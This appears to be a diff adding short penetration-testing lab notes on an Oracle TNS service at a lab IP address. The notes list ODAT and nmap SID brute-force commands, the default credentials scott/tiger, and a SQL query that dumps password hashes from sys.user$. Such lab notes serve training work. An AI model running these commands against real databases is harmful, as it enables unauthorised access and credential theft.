@@ -1,0 +1,11 @@
+Oracle TNS
+target: 10.129.205.19
+./odat.py all -s 10.129.205.19
+SID: XE
+Service: XE XEXDB
+credentials: scott/tiger
+sudo nmap -p1521 -sV 10.129.205.19 --open --script oracle-sid-brute
+valid SID: XE
+
+select * from user_role_privs;
+select name, password from sys.user$;
